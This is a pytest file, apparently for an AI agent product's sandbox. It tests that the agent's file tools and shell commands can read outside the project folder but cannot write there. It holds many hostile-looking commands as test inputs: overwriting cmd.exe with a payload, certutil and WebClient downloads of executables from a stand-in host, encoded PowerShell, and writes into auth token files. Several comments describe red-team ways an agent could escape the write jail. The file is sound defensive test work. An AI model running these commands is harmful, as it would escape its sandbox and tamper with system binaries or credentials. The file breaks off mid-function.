"""Project write jail: reads may leave the folder; writes may not (project scope)."""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

import pytest

from remedy.core.errors import SecurityError
from remedy.core.shell_write_jail import (
    check_shell_write_jail,
    extract_path_candidates,
    is_runtime_executable_path,
    looks_like_mutation,
)
from remedy.core.workspace import (
    allowed_roots_for_scope,
    workspace_context_block,
    write_roots_for_scope,
)


def _make_runtime(proj: Path, *, scope: str = "project", home: Path | None = None):
    """Minimal runtime-shaped object with real resolve/write roots."""
    from remedy.core.workspace import (
        allowed_roots_for_scope as _ar,
    )
    from remedy.core.workspace import (
        effective_access_scope,
    )
    from remedy.core.workspace import (
        write_roots_for_scope as _wr,
    )

    home = home or (proj.parent / "homeuser")
    if not home.exists():
        home.mkdir(parents=True, exist_ok=True)

    class RT:
        def access_scope(self) -> str:
            return effective_access_scope(scope, str(proj))

        def effective_project_path(self) -> Path:
            return proj.resolve()

        def allowed_roots(self):
            return _ar(self.access_scope(), proj, home=home)

        def write_roots(self):
            return _wr(self.access_scope(), proj, home=home)

        def project_path_is_unset(self) -> bool:
            return False

        def resolve_tool_path(self, path: str, *, for_write: bool = False) -> Path:
            # Same helpers as Agent.resolve_tool_path (workspace.resolve_*).
            from remedy.core.workspace import resolve_read_path, resolve_write_path

            if for_write:
                from remedy.core.approvals import APPROVALS, normalize_approval_mode

                approval = normalize_approval_mode(
                    getattr(self, "_approval_mode", None) or APPROVALS.mode
                )
                return resolve_write_path(
                    path or ".",
                    roots=self.write_roots(),
                    access_scope=self.access_scope(),
                    approval_mode=approval,
                    project_bound=not self.project_path_is_unset(),
                )
            return resolve_read_path(
                path or ".", roots=self.allowed_roots(), access_scope=self.access_scope()
            )

        def _track_artifact(self, _p: str) -> None:
            pass

        def _register_comfyui_tools(self) -> None:
            pass

        def _register_vision_tools(self) -> None:
            pass

        def _register_local_discover_tools(self) -> None:
            pass

        def _register_skill_tools(self) -> None:
            pass

    return RT()


def test_write_roots_exclude_profile_folders(tmp_path: Path):
    home = tmp_path / "home"
    home.mkdir()
    for name in ("Desktop", "Documents", "Downloads"):
        (home / name).mkdir()
    proj = tmp_path / "MyProject"
    proj.mkdir()

    reads = [r.resolve() for r in allowed_roots_for_scope("project", proj, home=home)]
    writes = [r.resolve() for r in write_roots_for_scope("project", proj, home=home)]

    assert proj.resolve() in reads
    assert (home / "Desktop").resolve() in reads
    assert writes == [proj.resolve()]


def test_runtime_resolve_read_desktop_ok_write_denied(tmp_path: Path):
    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    note = desk / "notes.txt"
    note.write_text("research", encoding="utf-8")
    proj = tmp_path / "proj"
    proj.mkdir()

    rt = _make_runtime(proj, scope="project", home=home)
    # Read path OK
    assert rt.resolve_tool_path(str(note), for_write=False) == note.resolve()
    # Write path denied
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(desk / "escape.txt"), for_write=True)
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(note), for_write=True)


def test_runtime_write_inside_project_ok(tmp_path: Path):
    home = tmp_path / "home"
    home.mkdir()
    proj = tmp_path / "proj"
    proj.mkdir()
    target = proj / "ok.txt"
    rt = _make_runtime(proj, scope="project", home=home)
    resolved = rt.resolve_tool_path("ok.txt", for_write=True)
    assert resolved == target.resolve()
    resolved = rt.resolve_tool_path(str(target), for_write=True)
    assert resolved == target.resolve()


def test_home_scope_allows_write_under_home(tmp_path: Path):
    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    proj = tmp_path / "proj"
    proj.mkdir()
    rt = _make_runtime(proj, scope="home", home=home)
    p = rt.resolve_tool_path(str(desk / "x.txt"), for_write=True)
    assert p == (desk / "x.txt").resolve()


def test_full_scope_with_project_writes_machine_wide(tmp_path: Path):
    """access_scope=full with a project bound: writes anywhere (auth/sidecar still refused)."""
    home = tmp_path / "home"
    home.mkdir()
    desk = home / "Desktop"
    desk.mkdir()
    proj = tmp_path / "proj"
    proj.mkdir()
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    target = outside / "y.txt"
    rt = _make_runtime(proj, scope="full", home=home)
    assert rt.resolve_tool_path(str(target), for_write=True) == target.resolve()
    assert rt.resolve_tool_path(str(desk / "ok.txt"), for_write=True) == (
        desk / "ok.txt"
    ).resolve()
    ok = rt.resolve_tool_path("in_proj.txt", for_write=True)
    assert ok == (proj / "in_proj.txt").resolve()
    # Remedy's own installed code: refused with its own message, not the jail's.
    sidecar = home / ".remedy" / "voice" / "runtime" / "app" / "remedy" / "core" / "x.py"
    with pytest.raises(SecurityError) as ei:
        rt.resolve_tool_path(str(sidecar), for_write=True)
    assert "Remedy's own installed code" in str(ei.value)
    # …and it is still readable.
    assert rt.resolve_tool_path(str(sidecar), for_write=False) == sidecar.resolve()


def test_project_scope_denial_names_project_not_full(tmp_path: Path):
    """Denial text matches the configured scope; home says 'full' is next."""
    home = tmp_path / "home"
    home.mkdir()
    proj = tmp_path / "proj"
    proj.mkdir()
    outside = tmp_path / "elsewhere" / "y.txt"
    rt = _make_runtime(proj, scope="project", home=home)
    with pytest.raises(SecurityError) as ei:
        rt.resolve_tool_path(str(outside), for_write=True)
    msg = str(ei.value)
    assert "(project)" in msg and "access_scope=project" in msg
    rt = _make_runtime(proj, scope="home", home=home)
    with pytest.raises(SecurityError) as ei:
        rt.resolve_tool_path(str(outside), for_write=True)
    msg = str(ei.value)
    assert "(home)" in msg and "access_scope=full" in msg


@pytest.mark.asyncio
async def test_file_write_tool_blocks_desktop(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    # Isolate from host ~/.remedy approval_mode (CI is ask; local may be auto).
    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("auto")
    try:
        home = tmp_path / "home"
        desk = home / "Desktop"
        desk.mkdir(parents=True)
        proj = tmp_path / "proj"
        proj.mkdir()

        rt = _make_runtime(proj, scope="project", home=home)
        reg = ToolRegistry()
        # Attach registry + config-like attrs expected by tools
        rt.tool_registry = reg  # type: ignore[attr-defined]
        rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
        rt._session_id = "test-session"  # type: ignore[attr-defined]
        register_workspace_tools(rt)

        result = await reg.execute(
            "file_write", path=str(desk / "escape_jail.txt"), content="nope"
        )
        assert "PATH_DENIED" in result or "path not allowed" in result.lower()
        assert not (desk / "escape_jail.txt").exists()

        # Inside project still works
        ok = await reg.execute("file_write", path="inside.txt", content="yes")
        assert "PATH_DENIED" not in ok
        assert "APPROVAL_REQUIRED" not in ok
        assert (proj / "inside.txt").read_text(encoding="utf-8") == "yes"
    finally:
        APPROVALS.set_mode(prev)


@pytest.mark.asyncio
async def test_file_write_tool_full_allows_desktop(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """Full (warn) must not jail file_write to Desktop / sibling trees."""
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "full", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("full")
    try:
        home = tmp_path / "home"
        desk = home / "Desktop"
        desk.mkdir(parents=True)
        proj = tmp_path / "proj"
        proj.mkdir()
        sib = tmp_path / "sibling"
        sib.mkdir()

        rt = _make_runtime(proj, scope="project", home=home)
        rt._approval_mode = "full"  # type: ignore[attr-defined]
        reg = ToolRegistry()
        rt.tool_registry = reg  # type: ignore[attr-defined]
        rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
        rt._session_id = "test-session-full"  # type: ignore[attr-defined]
        register_workspace_tools(rt)

        dest = desk / "full_ok.txt"
        result = await reg.execute(
            "file_write", path=str(dest), content="owner"
        )
        assert "PATH_DENIED" not in result, result
        assert "WRITE_JAIL" not in result, result
        assert dest.read_text(encoding="utf-8") == "owner"

        rel = await reg.execute(
            "file_write", path="../sibling/via_rel.txt", content="rel"
        )
        assert "PATH_DENIED" not in rel, rel
        assert (sib / "via_rel.txt").read_text(encoding="utf-8") == "rel"
    finally:
        APPROVALS.set_mode(prev)


@pytest.mark.asyncio
async def test_file_read_tool_allows_desktop(tmp_path: Path):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.skills.tool_registry import ToolRegistry

    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    note = desk / "research.txt"
    note.write_text("outside knowledge", encoding="utf-8")
    proj = tmp_path / "proj"
    proj.mkdir()

    rt = _make_runtime(proj, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "test-session"  # type: ignore[attr-defined]
    register_workspace_tools(rt)

    result = await reg.execute("file_read", path=str(note))
    assert "outside knowledge" in result
    assert "PATH_DENIED" not in result


@pytest.mark.asyncio
async def test_file_edit_tool_blocks_desktop(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("auto")
    try:
        home = tmp_path / "home"
        desk = home / "Desktop"
        desk.mkdir(parents=True)
        note = desk / "research.txt"
        note.write_text("alpha", encoding="utf-8")
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "local.txt").write_text("alpha", encoding="utf-8")

        rt = _make_runtime(proj, scope="project", home=home)
        reg = ToolRegistry()
        rt.tool_registry = reg  # type: ignore[attr-defined]
        rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
        rt._session_id = "test-session"  # type: ignore[attr-defined]
        register_workspace_tools(rt)

        denied = await reg.execute(
            "file_edit", path=str(note), old_string="alpha", new_string="beta"
        )
        assert "PATH_DENIED" in denied or "path not allowed" in denied.lower()
        assert note.read_text(encoding="utf-8") == "alpha"

        ok = await reg.execute(
            "file_edit", path="local.txt", old_string="alpha", new_string="beta"
        )
        assert "PATH_DENIED" not in ok
        assert "APPROVAL_REQUIRED" not in ok
        assert (proj / "local.txt").read_text(encoding="utf-8") == "beta"
    finally:
        APPROVALS.set_mode(prev)


def test_workspace_context_mentions_write_jail(tmp_path: Path):
    block = workspace_context_block(tmp_path, access_scope="project")
    assert "focus folder" in block.lower() or "project" in block.lower()
    assert "file_write" in block or "edit" in block.lower()


def test_shell_write_jail_allows_runtime_bin_invoke(tmp_path: Path):
    """Invoking python.exe / gcc.exe is not a write to that binary path."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    (sticky / "game.py").write_text("print(1)\n", encoding="utf-8")
    (sticky / "hello.c").write_text("int main(){return 0;}\n", encoding="utf-8")
    roots = [sticky.resolve()]

    allowed = [
        r"C:\Python312\python.exe game.py",
        r'"C:\Program Files\Python312\python.exe" game.py',
        r"C:\mingw64\bin\gcc.exe hello.c -o hello.exe",
        r"C:\Program Files\nodejs\node.exe game.js",
        r"py -3 game.py",
        r"python game.py",
        r".\hello.exe",
        r"gcc hello.c -o hello.exe && .\hello.exe",
    ]
    for cmd in allowed:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is None, f"false jail for compile/run: {cmd!r} → {hit}"

    # Running an outside *script* is still a jail (payload, not the runtime)
    blocked = check_shell_write_jail(
        r'C:\Python312\python.exe C:\Users\Public\evil.py',
        write_roots=roots,
        cwd=sticky,
        project_bound=True,
        access_scope="project",
    )
    assert blocked is not None


def test_shell_write_jail_blocks_sibling_set_content(tmp_path: Path):
    """SecretSticky must not Set-Content into SecretFolder (sibling trees)."""
    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    roots = [sticky.resolve()]

    cmd = (
        f'Set-Content -Path "{folder / "vault.rs"}" -Value "pwned" -Encoding utf8'
    )
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd,
        write_roots=roots,
        cwd=sticky,
        project_bound=True,
        access_scope="project",
    )
    assert hit is not None
    assert "WRITE" in hit.upper() or "outside" in hit.lower() or "jail" in hit.lower()

    # Inside focus is fine
    ok_cmd = f'Set-Content -Path "{sticky / "ok.txt"}" -Value "yes"'
    assert (
        check_shell_write_jail(
            ok_cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )

    # Read-only with absolute sibling path is allowed (research)
    read_cmd = f'Get-Content "{folder / "README.md"}"'
    assert (
        check_shell_write_jail(
            read_cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )


def test_shell_write_jail_blocks_runtime_bin_as_destination(tmp_path: Path):
    """copy/del/Set-Content onto python.exe / cmd.exe must not skip the dest."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    (sticky / "payload.exe").write_bytes(b"x")
    roots = [sticky.resolve()]
    cases = [
        r'copy payload.exe C:\Windows\System32\cmd.exe',
        r'del C:\Python312\python.exe',
        r'Set-Content -Path C:\Python312\python.exe -Value pwned',
        r'gcc hello.c -o C:\Windows\System32\cmd.exe',
        r'cmd /c copy payload.exe C:\Windows\System32\cmd.exe',
        r'cmd /c echo pwn > C:\Users\Public\cmd.exe',
        r"Set-Content C:\Users\Public\pwsh.exe pwned",
        r'C:\Python312\python.exe game.py & copy payload.exe C:\Python312\python.exe',
        r'C:\Windows\System32\cmd.exe /c echo hi & copy pwn C:\Windows\System32\cmd.exe',
        r'C:\Windows\System32\cmd.exe /c copy payload.exe C:\Windows\System32\cmd.exe',
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for dest-is-runtime: {cmd}"


def test_shell_write_jail_blocks_forward_slash_drive_and_ps_home(tmp_path: Path):
    """C:/… is Windows-absolute; $HOME / $USERPROFILE dests must fail closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    (sticky / "decoy.txt").write_text("in-root", encoding="utf-8")
    roots = [sticky.resolve()]
    cases = [
        "echo pwn > C:/Users/Public/pwn.txt",
        "Set-Content C:/Users/Public/pwn.txt pwned",
        "python -c \"open(r'decoy.txt','w').write('x'); open(r'C:/Users/Public/x','w')\"",
        "'pwn' > \"$HOME\\Desktop\\pwn.txt\"",
        "echo pwn > $USERPROFILE\\Desktop\\pwn.txt",
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for: {cmd!r}"
    exe_oneshots = [
        "python.exe -c \"open(r'C:/Users/Public/x','w').write('pwn')\"",
        "node.exe -e \"require('fs').writeFileSync('C:/Users/Public/x','x')\"",
        (
            "python -c \""
            "open(r'C:/Users/Public/ok_decoy.txt','w').write('x'); "
            "(Path('C:/')/'Users'/'Public'/'x').write_text('z')\""
        ),
    ]
    # The decoy path above is outside roots too — also test an in-root abs decoy.
    in_root = sticky / "ok.txt"
    mixed = (
        "python -c \""
        f"open(r'{in_root.as_posix()}','w').write('x'); "
        "(Path('C:/')/'Users'/'Public'/'hid').write_text('z')\""
    )
    for cmd in exe_oneshots + [mixed]:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for: {cmd!r}"

    # Runtime-bin dests still block after the C:/ extraction fix.
    runtime_dest = check_shell_write_jail(
        r"copy payload.exe C:\Windows\System32\cmd.exe",
        write_roots=roots,
        cwd=sticky,
        project_bound=True,
        access_scope="project",
    )
    assert runtime_dest is not None


def test_extract_forward_slash_drive_paths():
    found = extract_path_candidates("echo pwn > C:/Users/Public/pwn.txt")
    assert any("C:/Users/Public/pwn.txt" in t or "C:/Users/Public" in t for t in found)
    found2 = extract_path_candidates('Set-Content "C:/Users/Public/pwn.txt" pwned')
    assert any("C:/Users/Public/pwn.txt" in t for t in found2)


def test_shell_write_jail_blocks_numbered_redirect(tmp_path: Path):
    """`dir 1>` / `2>` to an outside file is a write, not a ignored redirect."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r"dir 1> C:\Users\Public\pwn.txt",
        r"Get-Content readme.txt 2> C:\Users\Administrator\Desktop\leak.txt",
    ]
    for cmd in cases:
        assert looks_like_mutation(cmd), cmd
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for numbered redirect: {cmd}"
    # Dev-null dups stay non-mutations
    assert looks_like_mutation("dir 2>nul") is False
    assert looks_like_mutation("dir 2>/dev/null") is False


def test_runtime_executable_path_does_not_skip_data_files():
    assert is_runtime_executable_path(r"C:\Python312\python.exe") is True
    assert is_runtime_executable_path("python") is True
    assert is_runtime_executable_path(r"C:\proj\python_pwned.txt") is False
    assert is_runtime_executable_path(r"C:\proj\notes.md") is False


def test_shell_write_jail_blocks_sc_copy_python_and_opaque(tmp_path: Path):
    """Review P0: sc/copy/python -c/env path mutation must not slip past jail."""
    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    roots = [sticky.resolve()]
    target = folder / "pwn.txt"

    cases = [
        f'sc "{target}" "hi"',
        f'copy a.txt "{target}"',
        f'xcopy a.txt "{target}"',
        f'move a.txt "{target}"',
        f'python -c "open(r\'{target}\', \'w\').write(\'x\')"',
        r'Set-Content -Path $env:USERPROFILE\Desktop\leak.txt -Value z',
        r'Set-Content -Path (Join-Path $env:USERPROFILE "SecretFolder\x") -Value z',
        r"Set-Content ([IO.Path]::Combine('C:\Users\Administrator','Desktop','pwn.txt')) x",
        r"Set-Content ([System.IO.Path]::Combine('C:\Users\Public','pwn.txt')) x",
        r'Set-Content \Users\Public\pwn.txt pwned',
        f'Set-Content "{folder / "python_pwned.txt"}" hi',
    ]
    for cmd in cases:
        assert looks_like_mutation(cmd), cmd
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for: {cmd}"


def test_shell_write_jail_blocks_mixed_opaque_dest(tmp_path: Path):
    """Issue 9: in-root source + opaque dest must still fail closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    (sticky / "a.txt").write_text("x", encoding="utf-8")
    roots = [sticky.resolve()]
    cases = [
        rf'copy "{sticky / "a.txt"}" $env:USERPROFILE\Desktop\b.txt',
        rf'Copy-Item "{sticky / "a.txt"}" (Join-Path $env:USERPROFILE Desktop\b.txt)',
        r'copy a.txt %USERPROFILE%\Desktop\b.txt',
        r'Set-Content -Path %TEMP%\leak.txt -Value z',
        r'iwr https://example.com -OutFile %TEMP%\x.html',
        r'curl -o %USERPROFILE%\Desktop\x.html https://example.com',
        r"Set-Content ([IO.Path]::Combine('SecretFolder','pwn.txt')) x",
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for mixed/opaque: {cmd}"


def test_shell_write_jail_blocks_encoded_and_archive(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    block = check_shell_write_jail(
        "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block is not None
    assert "encoded" in block.lower() or "archive" in block.lower() or "cannot be proven" in block.lower()
    block2 = check_shell_write_jail(
        "Expand-Archive -Path a.zip -DestinationPath C:\\Users\\Public\\out",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block2 is not None


def test_shell_write_jail_blocks_global_package_installs(tmp_path: Path):
    """Global package managers write outside project roots (red-team 2026-07-30)."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        "npm install -g evil-pkg",
        "npm i --global evil",
        "npm -g install evil",
        "yarn global add evil",
        "cargo install ripgrep",
        "gem install foo",
        "go install example.com/x@latest",
        "pip install --user evil",
        "python -m pip install --user evil",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
    # Local npm install under project cwd remains allowed (capability)
    assert (
        check_shell_write_jail(
            "npm install lodash",
            write_roots=[proj],
            cwd=proj,
            project_bound=True,
        )
        is None
    )


def test_shell_write_jail_blocks_powershell_short_e(tmp_path: Path):
    """powershell -e <base64> is EncodedCommand short form — fail closed."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        "powershell -e JABzAGU=",
        "powershell -E JABzAGU=",
        "pwsh -NoP -e SQBFAFgA",
        "powershell.exe -NonInteractive -e XX",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
        assert "encoded" in hit.lower() or "cannot be proven" in hit.lower()


def test_shell_write_jail_blocks_fsutil_createnew(tmp_path: Path):
    """fsutil file createnew outside roots must not slip past mutation hints."""
    from remedy.core.shell_write_jail import check_shell_write_jail, looks_like_mutation

    proj = tmp_path / "proj"
    proj.mkdir()
    cmd = r"fsutil file createnew C:\Users\Public\pwn.txt 1"
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd, write_roots=[proj], cwd=proj, project_bound=True
    )
    assert hit is not None
    assert "outside" in hit.lower() or "write root" in hit.lower()


def test_shell_write_jail_blocks_download_drop_vectors(tmp_path: Path):
    """WebClient / certutil urlcache / FromBase64 / IRM -OutFile hide destinations."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        r"(New-Object Net.WebClient).DownloadFile('http://x','C:\Users\Public\p.exe')",
        r"certutil -urlcache -split -f http://x/a.exe C:\Users\Public\a.exe",
        r"[Convert]::FromBase64String('YWJj') | Set-Content out.bin",
        r"Invoke-RestMethod http://x -OutFile C:\Users\Public\p.bin",
        r"$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://x')",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
        assert "encoded" in hit.lower() or "cannot be proven" in hit.lower()


def test_shell_write_jail_blocks_bare_ps_var_path(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    block = check_shell_write_jail(
        'Set-Content -Path $dest -Value "pwned"',
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block is not None
    assert "variable" in block.lower() or "cannot prove" in block.lower()


def test_shell_write_jail_blocks_mutation_without_paths(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    outside = tmp_path / "other"
    proj.mkdir()
    outside.mkdir()
    # cwd inside project → pathless mutation (e.g. npm install) allowed
    ok = check_shell_write_jail(
        "npm install left-pad",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert ok is None
    # cwd outside project → pathless mutation blocked
    block = check_shell_write_jail(
        "Remove-Item -Recurse -Force",
        write_roots=[proj],
        cwd=outside,
        project_bound=True,
    )
    assert block is not None
    assert "write root" in block.lower() or "proven path" in block.lower()


def test_shell_write_jail_blocks_interpreter_oneshot_without_paths(tmp_path: Path):
    """Issue 10: python -c / node -e without extractable paths fail closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r'''python -c "open(r'C:\\Users\\Public\\pwn.txt','w').write('x')"''',
        r'''python -c "from pathlib import Path; Path.home().joinpath('Desktop','x').write_text('z')"''',
        r'''node -e "require('fs').writeFileSync(process.env.USERPROFILE+'/Desktop/x','z')"''',
        r'''node -e "require('fs').writeFileSync('C:\\\\Users\\\\Public\\\\x','z')"''',
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for interpreter: {cmd}"
    # Concatenated dest with no extractable path token — fail closed
    concat = r'''python -c "open('C:'+'\\\\Users\\\\Public\\\\x','w').write('z')"'''
    assert (
        check_shell_write_jail(
            concat,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is not None
    ), "pathless mutating python -c must fail closed"
    # print + write in one -c string must NOT match the readonly allowlist
    smuggle = r'''python -c "print(1); open(r'C:\\Users\\Public\\pwn.txt','w').write('x')"'''
    assert (
        check_shell_write_jail(
            smuggle,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is not None
    ), "print+write python -c must stay jailed"

    # Pure print under project cwd is allowed (partner one-shots / probes)
    pure = r'''py -c "print(1)"'''
    assert (
        check_shell_write_jail(
            pure,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    ), "pure py -c print under project cwd should not jail"

    # Proven in-root path still allowed (no outside offenders, no opaque)
    ok = f'''python -c "open(r'{sticky / "ok.txt"}','w').write('y')"'''
    assert (
        check_shell_write_jail(
            ok,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )


def test_shell_write_jail_blocks_constructed_dest_and_stdin(tmp_path: Path):
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r"echo pwn > %CD:~0,1%:\Temp\x.txt",
        r"Set-Content -Path ([char]67+':\Temp\x.txt') pwn",
        r"echo open(chr(67)+':\\Temp\\x','w').write('pwn') | python -",
        r"Set-Content -Value pwn ('{0}:\Temp\x.txt' -f 67)",
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for constructed dest: {cmd}"


def test_shell_write_jail_blocks_relative_escape(tmp_path: Path):
    proj = tmp_path / "SecretSticky"
    sibling = tmp_path / "SecretFolder"
    proj.mkdir()
    sibling.mkdir()
    cmd = r'Set-Content -Path "..\SecretFolder\leak.txt" -Value x'
    hit = check_shell_write_jail(
        cmd,
        write_roots=[proj.resolve()],
        cwd=proj,
        project_bound=True,
        access_scope="project",
    )
    assert hit is not None


def test_shell_write_jail_extracts_windows_paths():
    paths = extract_path_candidates(
        r'Set-Content C:\Users\Administrator\SecretFolder\x.rs -Value a'
    )
    assert any("SecretFolder" in p for p in paths)


def test_shell_write_jail_blocks_auth_under_home_write_roots(tmp_path: Path, monkeypatch):
    """Home-scope write roots include user home; auth/** must still be refused.

    Gap: shell jail only checked path-under-roots, so Set-Content into
    ``~/.remedy/auth`` under access_scope=home was allowed. File tools already
    refuse via ``resolve_under_roots``; shell must match.
    """
    from remedy.core.security import clear_protected_auth_roots_cache

    home = tmp_path / "home"
    proj = tmp_path / "proj"
    home.mkdir()
    proj.mkdir()
    auth = home / ".remedy" / "auth"
    auth.mkdir(parents=True)
    secret = auth / "local_api_token"
    secret.write_text("tokensecretvalue", encoding="utf-8")

    # Path-part (.remedy/auth) detection works without REMEDY_HOME; also pin env.
    monkeypatch.setenv("REMEDY_HOME", str(home / ".remedy"))
    clear_protected_auth_roots_cache()

    roots = write_roots_for_scope("home", proj, home=home)
    assert any(r.resolve() == home.resolve() for r in roots)

    # File-tool path: home scope still protected
    rt = _make_runtime(proj, scope="home", home=home)
    with pytest.raises(SecurityError) as ei:
        rt.resolve_tool_path(str(secret), for_write=True)
    assert ei.value.details.get("rule") == "protected_secret_path"

    cmd = f'Set-Content -Path "{secret}" -Value "pwned" -Encoding utf8'
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd,
        write_roots=roots,
        cwd=proj,
        project_bound=True,
        access_scope="home",
    )
    assert hit is not None, "shell must refuse auth write under home roots"
    assert "auth" in hit.lower() or "protected" in hit.lower() or "secret" in hit.lower()

    # Same for provider_keys (absolute) under home write roots
    keys = auth / "provider_keys.json"
    hit_keys = check_shell_write_jail(
        f'Set-Content -Path "{keys}" -Value "{{}}"',
        write_roots=roots,
        cwd=home,
        project_bound=True,
        access_scope="home",
    )
    assert hit_keys is not None

    # Non-auth sibling under home remains allowed by the jail (path under roots)
    ok = check_shell_write_jail(
        f'Set-Content -Path "{home / "notes.txt"}" -Value "ok"',
        write_roots=roots,
        cwd=proj,
        project_bound=True,
        access_scope="home",
    )
    assert ok is None
    clear_protected_auth_roots_cache()


@pytest.mark.asyncio
async def test_bash_exec_enforces_shell_write_jail(tmp_path: Path, monkeypatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
